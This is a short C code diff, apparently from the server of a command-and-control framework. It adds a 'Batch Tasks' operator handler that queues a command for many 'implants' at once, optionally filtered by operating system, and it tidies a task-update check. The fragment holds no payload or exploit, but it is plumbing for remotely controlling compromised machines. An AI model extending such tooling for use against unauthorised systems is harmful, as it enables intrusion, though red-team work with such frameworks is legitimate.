@@ -180,7 +180,7 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
             free(data);
             return strdup("{\"error\": \"Invalid Task Id\"}");
         }   
-        if (!update_task(con, task_id->valueint, command->valuestring)) {
+        if (update_task(con, task_id->valueint, command->valuestring) == false) {
             free(data);
             return strdup("{\"update\": \"false\"}");
         } 
@@ -344,6 +344,22 @@ void *operator_handler(void *Args) {
                 //SSL_write(ssl, arr, strlen(arr));
                 free(arr);
             }
+        } else if (strcmp(about->valuestring, "Batch Tasks") == 0) {
+                cJSON *os = cJSON_GetObjectItem(requested_info, "os");
+                cJSON *command = cJSON_GetObjectItem(requested_info, "command");
+				bool added;
+				if (!os) {
+                    added = batch_tasks(con, command->valuestring, NULL);
+                } else {
+					added = batch_tasks(con, command->valuestring, os->valuestring);
+				}
+				cJSON *isValid = cJSON_CreateObject();
+				cJSON_AddBoolToObject(isValid, "Added", added);
+				char *info = cJSON_Print(isValid);
+				send_json(ssl, info);
+				free(info);
+				cJSON_Delete(isValid);
+				
         }
         cJSON_Delete(requested_info);
     } 
